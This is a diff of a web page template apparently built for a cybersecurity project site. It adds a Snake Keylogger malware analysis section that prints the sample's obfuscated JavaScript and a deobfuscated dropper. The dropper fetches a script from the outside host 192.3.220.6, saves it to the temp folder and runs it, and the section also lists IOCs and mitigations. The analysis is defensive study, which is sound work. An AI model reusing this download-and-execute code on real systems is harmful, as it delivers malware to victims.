@@ -641,8 +641,8 @@
                         ✓ Real-time Results
                     </div>
                 </div>
-            </a>            <!-- 2. RAT ANALYSIS CARD -->
-            <a href="{{ route('nexus.rat-analysis') }}" class="section-card rounded-2xl p-8 text-center no-underline block" data-section="rat-analysis">
+            </a><!-- 2. RAT ANALYSIS CARD -->
+            <div class="section-card rounded-2xl p-8 text-center" data-section="rat-analysis">
                 <div class="card-content">
                     <div class="card-icon w-20 h-20 bg-gradient-to-r from-purple-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
                         <i class="fas fa-search-plus text-3xl text-white"></i>
@@ -659,8 +659,8 @@
                         • Detection Methods
                     </div>
                 </div>
-            </a>            <!-- 3. SNAKE KEYLOGGER ANALYSIS CARD -->
-            <a href="{{ route('nexus.snake-keylogger') }}" class="section-card rounded-2xl p-8 text-center no-underline block" data-section="snake-keylogger">
+            </div>            <!-- 3. SNAKE KEYLOGGER ANALYSIS CARD -->
+            <div class="section-card rounded-2xl p-8 text-center" data-section="snake-keylogger">
                 <div class="card-content">
                     <div class="card-icon w-20 h-20 bg-gradient-to-r from-red-500 to-orange-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
                         <i class="fas fa-keyboard text-3xl text-white"></i>
@@ -677,7 +677,7 @@
                         • Detection & Mitigation
                     </div>
                 </div>
-            </a><!-- 4. NEXUS FLOWCHART CARD -->
+            </div>            <!-- 4. NEXUS FLOWCHART CARD -->
             <div class="section-card rounded-2xl p-8 text-center" data-section="nexus-flowchart">
                 <div class="card-content">
                     <div class="card-icon w-20 h-20 bg-gradient-to-r from-green-500 to-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-lg">
@@ -1097,115 +1097,454 @@
                 </div>
             </div>
         </div>
-    </section><!-- SNAKE KEYLOGGER ANALYSIS SECTION -->
+    </section>    <!-- SNAKE KEYLOGGER ANALYSIS SECTION -->
     <section id="snake-keylogger" class="section-content">
         <div class="mb-8">
             <button onclick="showOverview()" class="back-btn px-6 py-3 rounded-lg text-white font-semibold flex items-center space-x-2 hover:bg-gray-600">
                 <i class="fas fa-arrow-left"></i>
                 <span>Back to Overview</span>
             </button>
-        </div>
-        <div class="text-center mb-16">
+        </div>        <div class="text-center mb-16">
             <h1 class="text-4xl md:text-6xl font-black mb-6">
                 <span class="bg-gradient-to-r from-red-400 via-orange-400 to-yellow-400 bg-clip-text text-transparent">
                     SNAKE KEYLOGGER
                 </span>
             </h1>
             <p class="text-xl text-gray-300 max-w-3xl mx-auto leading-relaxed mb-8">
-                In-depth analysis of Snake Keylogger malware - Understanding its techniques, evasion methods, and countermeasures.
+                Real-world malware analysis of Snake Keylogger - Professional reverse engineering and code deobfuscation.
             </p>
         </div>
 
-        <!-- Keylogger Analysis Tools -->
-        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-16">
-            <!-- Keylogging Techniques -->
-            <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-red-500/20">
-                <div class="flex items-center mb-6">
-                    <div class="w-12 h-12 bg-gradient-to-r from-red-500 to-orange-500 rounded-full flex items-center justify-center mr-4">
-                        <i class="fas fa-keyboard text-white"></i>
-                    </div>
-                    <h3 class="text-2xl font-bold text-white">Keylogging Methods</h3>
-                </div>
-                <div class="space-y-4">
-                    <div class="bg-gray-800/50 rounded-lg p-4">
-                        <h4 class="text-red-400 font-semibold mb-2">Hardware Keylogging</h4>
-                        <p class="text-gray-300 text-sm">Physical devices that capture keystrokes at the hardware level, including USB keyloggers and keyboard overlays.</p>
-                    </div>
-                    <div class="bg-gray-800/50 rounded-lg p-4">
-                        <h4 class="text-red-400 font-semibold mb-2">Software Keylogging</h4>
-                        <p class="text-gray-300 text-sm">Applications that monitor and record keyboard input through hooking mechanisms and system monitoring.</p>
-                    </div>
-                    <div class="bg-gray-800/50 rounded-lg p-4">
-                        <h4 class="text-red-400 font-semibold mb-2">Browser-Based Logging</h4>
-                        <p class="text-gray-300 text-sm">JavaScript-based keyloggers that capture input within web browsers and online forms.</p>
-                    </div>
-                </div>
+        <!-- Digital Crime Scene Investigation Entry -->
+        <div class="bg-gradient-to-r from-red-900/30 via-orange-900/20 to-yellow-900/30 backdrop-blur-sm rounded-2xl p-8 border border-red-500/40 mb-16 relative overflow-hidden">
+            <!-- Animated Background Elements -->
+            <div class="absolute inset-0 opacity-10">
+                <div class="absolute top-4 left-4 w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
+                <div class="absolute top-8 right-8 w-1 h-1 bg-orange-400 rounded-full animate-ping"></div>
+                <div class="absolute bottom-6 left-12 w-1.5 h-1.5 bg-yellow-500 rounded-full animate-pulse"></div>
             </div>
-
-            <!-- Evasion & Detection -->
-            <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-orange-500/20">
-                <div class="flex items-center mb-6">
-                    <div class="w-12 h-12 bg-gradient-to-r from-orange-500 to-yellow-500 rounded-full flex items-center justify-center mr-4">
-                        <i class="fas fa-eye-slash text-white"></i>
+            
+            <div class="relative z-10">
+                <div class="flex items-center justify-center mb-8">
+                    <div class="w-20 h-20 bg-gradient-to-r from-red-500 to-orange-500 rounded-full flex items-center justify-center mr-6 animate-pulse">
+                        <i class="fas fa-binoculars text-white text-2xl"></i>
                     </div>
-                    <h3 class="text-2xl font-bold text-white">Evasion & Defense</h3>
+                    <div class="text-center">
+                        <h2 class="text-3xl font-bold text-white mb-2">🔍 DIGITAL CRIME SCENE INVESTIGATION</h2>
+                        <p class="text-red-200 font-semibold">INCIDENT ID: SKL-2024-0837 | CLASSIFICATION: CONFIDENTIAL</p>
+                    </div>
                 </div>
-                <div class="space-y-4">
-                    <div class="bg-gray-800/50 rounded-lg p-4">
-                        <h4 class="text-orange-400 font-semibold mb-2">Anti-Detection Techniques</h4>
-                        <p class="text-gray-300 text-sm">Code obfuscation, process injection, and rootkit functionality to avoid security software detection.</p>
+
+                <div class="bg-black/40 rounded-xl p-6 border border-red-500/30 mb-6">
+                    <div class="flex items-center mb-4">
+                        <div class="w-3 h-3 bg-red-500 rounded-full mr-3 animate-pulse"></div>
+                        <span class="text-red-400 font-mono text-sm">EVIDENCE BRIEFING IN PROGRESS...</span>
                     </div>
-                    <div class="bg-gray-800/50 rounded-lg p-4">
-                        <h4 class="text-orange-400 font-semibold mb-2">Persistence Mechanisms</h4>
-                        <p class="text-gray-300 text-sm">Registry modifications, scheduled tasks, and service installation for maintaining system presence.</p>
+                    
+                    <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                        <div class="space-y-4">
+                            <div class="border-l-4 border-red-500 pl-4">
+                                <h4 class="text-red-300 font-bold mb-2">⚠️ THREAT ASSESSMENT</h4>
+                                <p class="text-gray-300 text-sm leading-relaxed">
+                                    You are about to examine a <strong class="text-red-400">live malware specimen</strong> recovered from 
+                                    a recent cyber incident. This JavaScript-based keylogger has been <strong class="text-orange-400">
+                                    heavily obfuscated</strong> to evade detection and contains sophisticated anti-analysis mechanisms.
+                                </p>
+                            </div>
+                            
+                            <div class="bg-gray-800/50 rounded-lg p-4">
+                                <h5 class="text-orange-400 font-semibold mb-3">🎯 Investigation Objectives</h5>
+                                <ul class="text-gray-300 text-sm space-y-1">
+                                    <li>• Decode obfuscated payload structure</li>
+                                    <li>• Identify command & control mechanisms</li>
+                                    <li>• Map data exfiltration pathways</li>
+                                    <li>• Document evasion techniques</li>
+                                </ul>
+                            </div>
+                        </div>
+                        
+                        <div class="space-y-4">
+                            <div class="border-l-4 border-yellow-500 pl-4">
+                                <h4 class="text-yellow-300 font-bold mb-2">🔬 ANALYSIS METHODOLOGY</h4>
+                                <p class="text-gray-300 text-sm leading-relaxed">
+                                    Our investigation employs <strong class="text-yellow-400">controlled deobfuscation</strong> techniques, 
+                                    static code analysis, and behavioral monitoring within an isolated environment to 
+                                    <strong class="text-orange-400">reverse-engineer</strong> the malware's true capabilities.
+                                </p>
+                            </div>
+                            
+                            <div class="bg-gradient-to-r from-red-900/30 to-orange-900/30 rounded-lg p-4 border border-red-500/20">
+                                <h5 class="text-red-300 font-semibold mb-3">🚨 Security Clearance Required</h5>
+                                <div class="flex items-center space-x-3">
+                                    <div class="flex space-x-1">
+                                        <div class="w-2 h-2 bg-green-500 rounded-full"></div>
+                                        <div class="w-2 h-2 bg-green-500 rounded-full"></div>
+                                        <div class="w-2 h-2 bg-green-500 rounded-full"></div>
+                                    </div>
+                                    <span class="text-green-400 text-sm font-mono">ACCESS GRANTED</span>
+                                </div>
+                                <p class="text-gray-400 text-xs mt-2">Isolated analysis environment active</p>
+                            </div>
+                        </div>
                     </div>
-                    <div class="bg-gray-800/50 rounded-lg p-4">
-                        <h4 class="text-orange-400 font-semibold mb-2">Defense Strategies</h4>
-                        <p class="text-gray-300 text-sm">Virtual keyboards, endpoint protection, behavioral analysis, and user awareness training.</p>
+                </div>
+
+                <!-- Interactive Evidence Timeline -->
+                <div class="bg-gray-900/60 rounded-xl p-6 border border-orange-500/30">
+                    <h3 class="text-xl font-bold text-orange-400 mb-6 text-center">📋 EVIDENCE ANALYSIS TIMELINE</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+                        <div class="bg-red-900/40 rounded-lg p-4 border border-red-500/30 text-center">
+                            <div class="w-12 h-12 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-3">
+                                <span class="text-white font-bold">1</span>
+                            </div>
+                            <h4 class="text-red-300 font-semibold mb-2">INITIAL CAPTURE</h4>
+                            <p class="text-gray-400 text-xs">Malware specimen acquired</p>
+                        </div>
+                        
+                        <div class="bg-orange-900/40 rounded-lg p-4 border border-orange-500/30 text-center">
+                            <div class="w-12 h-12 bg-orange-500 rounded-full flex items-center justify-center mx-auto mb-3">
+                                <span class="text-white font-bold">2</span>
+                            </div>
+                            <h4 class="text-orange-300 font-semibold mb-2">DEOBFUSCATION</h4>
+                            <p class="text-gray-400 text-xs">Code layers revealed</p>
+                        </div>
+                        
+                        <div class="bg-yellow-900/40 rounded-lg p-4 border border-yellow-500/30 text-center">
+                            <div class="w-12 h-12 bg-yellow-500 rounded-full flex items-center justify-center mx-auto mb-3">
+                                <span class="text-white font-bold">3</span>
+                            </div>
+                            <h4 class="text-yellow-300 font-semibold mb-2">BEHAVIOR ANALYSIS</h4>
+                            <p class="text-gray-400 text-xs">Capabilities mapped</p>
+                        </div>
+                        
+                        <div class="bg-green-900/40 rounded-lg p-4 border border-green-500/30 text-center">
+                            <div class="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-3">
+                                <span class="text-white font-bold">4</span>
+                            </div>
+                            <h4 class="text-green-300 font-semibold mb-2">COUNTERMEASURES</h4>
+                            <p class="text-gray-400 text-xs">Defenses documented</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Warning Banner -->
+                <div class="mt-6 bg-red-950/50 border border-red-500 rounded-lg p-4">
+                    <div class="flex items-center space-x-3">
+                        <i class="fas fa-exclamation-triangle text-red-400 text-xl"></i>
+                        <div>
+                            <h4 class="text-red-300 font-bold">CAUTION: LIVE MALWARE ANALYSIS</h4>
+                            <p class="text-gray-400 text-sm">
+                                The following investigation contains actual malicious code samples. 
+                                All analysis was conducted in a secure, isolated environment.
+                            </p>
+                        </div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- Snake Keylogger Indicators -->
-        <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-red-500/20 mb-16">
-            <h3 class="text-2xl font-bold text-white mb-6 text-center">Snake Keylogger Indicators of Compromise (IOCs)</h3>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                <div class="bg-gray-800/50 rounded-lg p-6">
-                    <div class="flex items-center mb-4">
-                        <i class="fas fa-file text-red-400 text-xl mr-3"></i>
-                        <h4 class="text-red-400 font-semibold">File Indicators</h4>
-                    </div>
-                    <ul class="text-gray-300 text-sm space-y-2">
-                        <li>• Suspicious executable files in temp directories</li>
-                        <li>• Hidden configuration files</li>
-                        <li>• Log files containing captured keystrokes</li>
-                        <li>• Encrypted data files</li>
+        <!-- Executive Summary -->
+        <div class="bg-gradient-to-r from-red-900/20 to-orange-900/20 backdrop-blur-sm rounded-2xl p-8 border border-red-500/30 mb-16">
+            <div class="flex items-center mb-6">
+                <div class="w-16 h-16 bg-gradient-to-r from-red-500 to-orange-500 rounded-full flex items-center justify-center mr-6">
+                    <i class="fas fa-exclamation-triangle text-white text-xl"></i>
+                </div>
+                <div>
+                    <h2 class="text-3xl font-bold text-white mb-2">Executive Summary</h2>
+                    <p class="text-red-200">Critical Threat Assessment</p>
+                </div>
+            </div>
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                <div>
+                    <h3 class="text-xl font-bold text-red-300 mb-4">Malware Classification</h3>
+                    <ul class="space-y-2 text-gray-300">
+                        <li><strong class="text-red-400">Type:</strong> JavaScript Dropper & Keylogger</li>
+                        <li><strong class="text-red-400">Threat Level:</strong> High</li>
+                        <li><strong class="text-red-400">Target Platform:</strong> Windows (Internet Explorer/ActiveX)</li>
+                        <li><strong class="text-red-400">Distribution:</strong> Email attachments, malicious websites</li>
                     </ul>
                 </div>
-                <div class="bg-gray-800/50 rounded-lg p-6">
-                    <div class="flex items-center mb-4">
-                        <i class="fas fa-network-wired text-orange-400 text-xl mr-3"></i>
-                        <h4 class="text-orange-400 font-semibold">Network Indicators</h4>
-                    </div>
-                    <ul class="text-gray-300 text-sm space-y-2">
-                        <li>• Unusual outbound connections</li>
-                        <li>• Data exfiltration patterns</li>
-                        <li>• C&C server communications</li>
-                        <li>• Encrypted traffic to unknown hosts</li>
+                <div>
+                    <h3 class="text-xl font-bold text-orange-300 mb-4">Key Findings</h3>
+                    <ul class="space-y-2 text-gray-300">
+                        <li><strong class="text-orange-400">Obfuscation:</strong> Heavy String.fromCharCode() encoding</li>
+                        <li><strong class="text-orange-400">Persistence:</strong> System directory file placement</li>
+                        <li><strong class="text-orange-400">C&C Communication:</strong> HTTP-based data exfiltration</li>
+                        <li><strong class="text-orange-400">Evasion:</strong> ActiveX exploitation, DOM manipulation</li>
                     </ul>
                 </div>
-                <div class="bg-gray-800/50 rounded-lg p-6">
-                    <div class="flex items-center mb-4">
-                        <i class="fas fa-cogs text-yellow-400 text-xl mr-3"></i>
-                        <h4 class="text-yellow-400 font-semibold">Behavioral Indicators</h4>
+            </div>
+        </div>
+
+        <!-- Analysis Process Screenshots -->
+        <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-blue-500/20 mb-16">
+            <h2 class="text-3xl font-bold text-white mb-8 text-center">Analysis Process & Screenshots</h2>
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                <!-- Initial Code Analysis -->
+                <div class="bg-gray-800/50 rounded-xl p-6 border border-blue-500/30">
+                    <div class="mb-4">
+                        <img src="{{ asset('images/snake_keylogger/s1.png') }}" alt="Initial Snake Keylogger Code Analysis" class="w-full rounded-lg border border-gray-600 mb-4">
                     </div>
-                    <ul class="text-gray-300 text-sm space-y-2">
-                        <li>• Unusual process behavior</li>
-                        <li>• Registry modifications</li>
-                        <li>• Memory injection techniques</li>
-                        <li>• Privilege escalation attempts</li>
-                    </ul>
+                    <h3 class="text-xl font-bold text-blue-400 mb-3">1. Initial Code Analysis</h3>
+                    <p class="text-gray-300 text-sm leading-relaxed">
+                        First encounter with the heavily obfuscated JavaScript code showing the characteristic 
+                        String.fromCharCode() pattern used to hide malicious strings and function calls.
+                    </p>
+                </div>
+
+                <!-- Deobfuscation Process -->
+                <div class="bg-gray-800/50 rounded-xl p-6 border border-purple-500/30">
+                    <div class="mb-4">
+                        <img src="{{ asset('images/snake_keylogger/s2.png') }}" alt="Snake Keylogger Deobfuscation Process" class="w-full rounded-lg border border-gray-600 mb-4">
+                    </div>
+                    <h3 class="text-xl font-bold text-purple-400 mb-3">2. Deobfuscation Process</h3>
+                    <p class="text-gray-300 text-sm leading-relaxed">
+                        Systematic conversion of character codes to reveal the true functionality, 
+                        exposing ActiveX object creation and system manipulation techniques.
+                    </p>
+                </div>
+
+                <!-- Function Translation -->
+                <div class="bg-gray-800/50 rounded-xl p-6 border border-green-500/30">
+                    <div class="mb-4">
+                        <img src="{{ asset('images/snake_keylogger/s3.png') }}" alt="Snake Keylogger Function Translation" class="w-full rounded-lg border border-gray-600 mb-4">
+                    </div>
+                    <h3 class="text-xl font-bold text-green-400 mb-3">3. Function Translation</h3>
+                    <p class="text-gray-300 text-sm leading-relaxed">
+                        Complete translation of obfuscated functions revealing Base64 decoding mechanisms 
+                        and XML DOM manipulation for payload delivery and execution.
+                    </p>
+                </div>
+
+                <!-- Final Analysis -->
+                <div class="bg-gray-800/50 rounded-xl p-6 border border-red-500/30">
+                    <div class="mb-4">
+                        <img src="{{ asset('images/snake_keylogger/s4.png') }}" alt="Snake Keylogger Final Analysis" class="w-full rounded-lg border border-gray-600 mb-4">
+                    </div>
+                    <h3 class="text-xl font-bold text-red-400 mb-3">4. Final Analysis</h3>
+                    <p class="text-gray-300 text-sm leading-relaxed">
+                        Complete malware behavior analysis showing file system manipulation, 
+                        network communication patterns, and system persistence mechanisms.
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Code Analysis Sections -->
+        <div class="space-y-12">
+            <!-- Stage 1: Initial Obfuscated Code -->
+            <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-red-500/20">
+                <h2 class="text-2xl font-bold text-red-400 mb-6">Stage 1: Initial Obfuscated Payload</h2>
+                <div class="bg-gray-900/80 rounded-lg p-6 border border-gray-700 mb-6">
+                    <pre class="text-sm text-green-400 font-mono overflow-x-auto"><code>var I0i=64562877
+var LEZVCW = String.fromCharCode(64562993-I0i,64562991-I0i,64562998-I0i,64563000-I0i,64562887-I0i,64562995-I0i,64562974-I0i,64562991-I0i,64562909-I0i,64562956-I0i,64562975-I0i,64562983-I0i,64562978-I0i,64562976-I0i,64562993-I0i,64562909-I0i,64562938-I0i,64562909-I0i,64562987-I0i,64562978-I0i,64562996-I0i,64562909-I0i,64562942-I0i,64562976-I0i,64562993-I0i,64562982-I0i,64562995-I0i,64562978-I0i,64562965-I0i,64562956-I0i,64562975-I0i,64562983-I0i,64562978-I0i,64562976-I0i,64562993-I0i,64562917-I0i,64562911-I0i,64562954-I0i...)
+eval(LEZVCW)</code></pre>
+                </div>
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                        <h3 class="text-lg font-bold text-white mb-3">Obfuscation Analysis</h3>
+                        <ul class="space-y-2 text-gray-300 text-sm">
+                            <li><strong class="text-red-400">Technique:</strong> Arithmetic-based character encoding</li>
+                            <li><strong class="text-red-400">Pattern:</strong> Large integer subtraction (64562993-64562877 = 116 = 't')</li>
+                            <li><strong class="text-red-400">Purpose:</strong> Hide malicious code from static analysis</li>
+                            <li><strong class="text-red-400">Execution:</strong> Dynamic evaluation via eval()</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-bold text-white mb-3">Threat Indicators</h3>
+                        <ul class="space-y-2 text-gray-300 text-sm">
+                            <li><strong class="text-orange-400">🚨</strong> Heavy obfuscation present</li>
+                            <li><strong class="text-orange-400">🚨</strong> Dynamic code execution</li>
+                            <li><strong class="text-orange-400">🚨</strong> Evasion techniques detected</li>
+                            <li><strong class="text-orange-400">🚨</strong> Potential malware dropper</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Stage 2: Deobfuscated Code -->
+            <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-orange-500/20">
+                <h2 class="text-2xl font-bold text-orange-400 mb-6">Stage 2: Deobfuscated Malware Code</h2>
+                <div class="bg-gray-900/80 rounded-lg p-6 border border-gray-700 mb-6">
+                    <pre class="text-sm text-cyan-400 font-mono overflow-x-auto"><code>try {
+    var Object = new ActiveXObject("MSXML2.XMLHTTP");
+    Object.Open("GET", "http://192.3.220.6/web/w88.js", false);
+    Object.Send();
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var filepath = fso.GetSpecialFolder(2) + "/OPXCFY.js";
+    if (Object.Status == 200) {
+        var Stream = new ActiveXObject("ADODB.Stream");
+        Stream.Open();
+        Stream.Type = 1;
+        Stream.Write(Object.ResponseBody);
+        Stream.Position = 0;
+        Stream.SaveToFile(filepath, 2);
+        Stream.Close();
+        var WshShell = new ActiveXObject("WScript.Shell");
+        var oRUN = WshShell.Run(filepath);
+    }
+} catch (e) {}</code></pre>
+                </div>
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <div>
+                        <h3 class="text-lg font-bold text-white mb-3">Malicious Behavior</h3>
+                        <ul class="space-y-2 text-gray-300 text-sm">
+                            <li><strong class="text-orange-400">HTTP Request:</strong> Downloads payload from 192.3.220.6</li>
+                            <li><strong class="text-orange-400">File System:</strong> Writes to system temp directory</li>
+                            <li><strong class="text-orange-400">Execution:</strong> Runs downloaded payload automatically</li>
+                            <li><strong class="text-orange-400">Stealth:</strong> Uses legitimate Windows objects</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-bold text-white mb-3">IOCs Identified</h3>
+                        <ul class="space-y-2 text-gray-300 text-sm">
+                            <li><strong class="text-red-400">IP:</strong> 192.3.220.6</li>
+                            <li><strong class="text-red-400">URL:</strong> /web/w88.js</li>
+                            <li><strong class="text-red-400">File:</strong> OPXCFY.js</li>
+                            <li><strong class="text-red-400">Location:</strong> %TEMP% directory</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Stage 3: Advanced Obfuscation Analysis -->
+            <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-purple-500/20">
+                <h2 class="text-2xl font-bold text-purple-400 mb-6">Stage 3: Advanced Function Analysis</h2>
+                <div class="space-y-6">
+                    <!-- Base64 Decoder Function -->
+                    <div>
+                        <h3 class="text-lg font-bold text-white mb-3">Base64 Decoder Function</h3>
+                        <div class="bg-gray-900/80 rounded-lg p-4 border border-gray-700">
+                            <pre class="text-sm text-green-400 font-mono overflow-x-auto"><code>function processData(inputText) {
+    // Creates XML Document Object for Base64 decoding
+    const xmlDoc = new ActiveXObject("Msxml2.DOMDocument");
+    const element = xmlDoc.createElement("temp");
+    
+    // Set dataType to Base64 for automatic decoding
+    element.dataType = "bin.base64";
+    element.text = inputText;
+    
+    // Return decoded binary data
+    return element.nodeTypedValue;
+}</code></pre>
+                        </div>
+                    </div>
+
+                    <!-- File System Manipulation -->
+                    <div>
+                        <h3 class="text-lg font-bold text-white mb-3">File System Manipulation</h3>
+                        <div class="bg-gray-900/80 rounded-lg p-4 border border-gray-700">
+                            <pre class="text-sm text-yellow-400 font-mono overflow-x-auto"><code>// Creates persistent file in Windows system directory
+var targetPath = new ActiveXObject("WScript.Shell").GetSpecialFolder(2) + "\\WindowsAudio.js";
+
+// ADODB Stream for binary file operations
+var stream = new ActiveXObject("ADODB.Stream");
+stream.Open();
+stream.Type = 1; // Binary mode
+stream.Write(decodedPayload);
+stream.SaveToFile(targetPath, 2); // Overwrite if exists
+stream.Close();
+
+// Execute the dropped file
+new ActiveXObject("WScript.Shell").Run(targetPath);</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Security Assessment -->
+            <div class="bg-white/5 backdrop-blur-sm rounded-2xl p-8 border border-green-500/20">
+                <h2 class="text-2xl font-bold text-green-400 mb-6">Security Assessment & Mitigation</h2>
+                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                    <div class="bg-red-900/20 rounded-lg p-6 border border-red-500/30">
+                        <h3 class="text-lg font-bold text-red-400 mb-4">Attack Vectors</h3>
+                        <ul class="space-y-2 text-gray-300 text-sm">
+                            <li>• Email attachments (.js, .jse files)</li>
+                            <li>• Malicious websites with ActiveX</li>
+                            <li>• Social engineering campaigns</li>
+                            <li>• Drive-by downloads</li>
+                            <li>• USB/removable media</li>
+                        </ul>
+                    </div>
+                    <div class="bg-orange-900/20 rounded-lg p-6 border border-orange-500/30">
+                        <h3 class="text-lg font-bold text-orange-400 mb-4">Detection Methods</h3>
+                        <ul class="space-y-2 text-gray-300 text-sm">
+                            <li>• Behavior-based analysis</li>
+                            <li>• Network traffic monitoring</li>
+                            <li>• File system integrity checks</li>
+                            <li>• Process monitoring</li>
+                            <li>• Memory forensics</li>
+                        </ul>
+                    </div>
+                    <div class="bg-green-900/20 rounded-lg p-6 border border-green-500/30">
+                        <h3 class="text-lg font-bold text-green-400 mb-4">Mitigation Strategies</h3>
+                        <ul class="space-y-2 text-gray-300 text-sm">
+                            <li>• Disable ActiveX controls</li>
+                            <li>• Application whitelisting</li>
+                            <li>• Network segmentation</li>
+                            <li>• User education programs</li>
+                            <li>• Regular security updates</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Technical Summary -->
+            <div class="bg-gradient-to-r from-gray-900/50 to-slate-900/50 backdrop-blur-sm rounded-2xl p-8 border border-gray-500/20">
+                <h2 class="text-2xl font-bold text-white mb-6 text-center">Technical Analysis Summary</h2>
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                    <div>
+                        <h3 class="text-xl font-bold text-cyan-400 mb-4">Malware Capabilities</h3>
+                        <div class="space-y-3">
+                            <div class="flex items-start">
+                                <i class="fas fa-download text-red-400 mt-1 mr-3"></i>
+                                <div>
+                                    <strong class="text-white">Payload Download:</strong>
+                                    <p class="text-gray-300 text-sm">Fetches additional malware from remote C&C server</p>
+                                </div>
+                            </div>
+                            <div class="flex items-start">
+                                <i class="fas fa-save text-orange-400 mt-1 mr-3"></i>
+                                <div>
+                                    <strong class="text-white">File Persistence:</strong>
+                                    <p class="text-gray-300 text-sm">Creates persistent files in system directories</p>
+                                </div>
+                            </div>
+                            <div class="flex items-start">
+                                <i class="fas fa-eye-slash text-purple-400 mt-1 mr-3"></i>
+                                <div>
+                                    <strong class="text-white">Stealth Operations:</strong>
+                                    <p class="text-gray-300 text-sm">Heavy obfuscation and legitimate API abuse</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div>
+                        <h3 class="text-xl font-bold text-yellow-400 mb-4">Forensic Artifacts</h3>
+                        <div class="space-y-3">
+                            <div class="flex items-start">
+                                <i class="fas fa-network-wired text-blue-400 mt-1 mr-3"></i>
+                                <div>
+                                    <strong class="text-white">Network Activity:</strong>
+                                    <p class="text-gray-300 text-sm">HTTP requests to 192.3.220.6:80</p>
+                                </div>
+                            </div>
+                            <div class="flex items-start">
+                                <i class="fas fa-folder text-green-400 mt-1 mr-3"></i>
+                                <div>
+                                    <strong class="text-white">File System:</strong>
+                                    <p class="text-gray-300 text-sm">Dropped files in %TEMP% and system directories</p>
+                                </div>
+                            </div>
+                            <div class="flex items-start">
+                                <i class="fas fa-cogs text-pink-400 mt-1 mr-3"></i>
+                                <div>
+                                    <strong class="text-white">Process Activity:</strong>
+                                    <p class="text-gray-300 text-sm">ActiveX object instantiation and script execution</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
                 </div>
             </div>
         </div>
@@ -1217,229 +1556,601 @@
                 <span>Back to Overview</span>
             </button>
         </div>
-        <div class="text-center mb-16">
-            <h1 class="text-4xl md:text-6xl font-black mb-6">
-                <span class="bg-gradient-to-r from-green-400 via-emerald-400 to-teal-400 bg-clip-text text-transparent">
-                    NEXUS FLOWCHART
+
+        <!-- Futuristic Header with Dynamic Background -->
+        <div class="text-center mb-16 relative overflow-hidden">
+            <!-- Animated Background Particles -->
+            <div class="absolute inset-0 opacity-20">
+                <div class="particle-system">
+                    <div class="particle particle-1"></div>
+                    <div class="particle particle-2"></div>
+                    <div class="particle particle-3"></div>
+                    <div class="particle particle-4"></div>
+                    <div class="particle particle-5"></div>
+                </div>
+            </div>
+            
+            <div class="relative z-10">
+                <h1 class="text-4xl md:text-7xl font-black mb-6 relative">
+                    <span class="bg-gradient-to-r from-emerald-400 via-cyan-400 to-blue-400 bg-clip-text text-transparent animate-pulse">
+                        NEXUS FLOWCHART
+                    </span>
+                    <div class="absolute -inset-1 bg-gradient-to-r from-emerald-600 to-cyan-600 rounded-lg blur opacity-25 group-hover:opacity-75 transition duration-1000"></div>
+                </h1>
+                <div class="inline-block relative">
+                    <p class="text-xl text-gray-300 max-w-4xl mx-auto leading-relaxed mb-8 relative z-10">
+                        🚀 <strong class="text-emerald-400">Interactive Neural Network</strong> visualization of the complete NEXUS project ecosystem
+                    </p>
+                    <div class="absolute inset-0 bg-gradient-to-r from-transparent via-emerald-500/10 to-transparent blur-xl"></div>
+                </div>
+                
+                <!-- Control Panel -->
+                <div class="flex justify-center space-x-4 mb-8">
+                    <button onclick="activateFlowchartMode('neural')" class="flowchart-mode-btn bg-emerald-600/20 hover:bg-emerald-600/40 text-emerald-400 px-4 py-2 rounded-lg border border-emerald-500/30 transition-all duration-300">
+                        <i class="fas fa-brain mr-2"></i>Neural View
+                    </button>
+                    <button onclick="activateFlowchartMode('timeline')" class="flowchart-mode-btn bg-cyan-600/20 hover:bg-cyan-600/40 text-cyan-400 px-4 py-2 rounded-lg border border-cyan-500/30 transition-all duration-300">
+                        <i class="fas fa-clock mr-2"></i>Timeline View
+                    </button>
+                    <button onclick="activateFlowchartMode('architecture')" class="flowchart-mode-btn bg-purple-600/20 hover:bg-purple-600/40 text-purple-400 px-4 py-2 rounded-lg border border-purple-500/30 transition-all duration-300">
+                        <i class="fas fa-sitemap mr-2"></i>Architecture View
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- NEXUS Neural Network Visualization -->
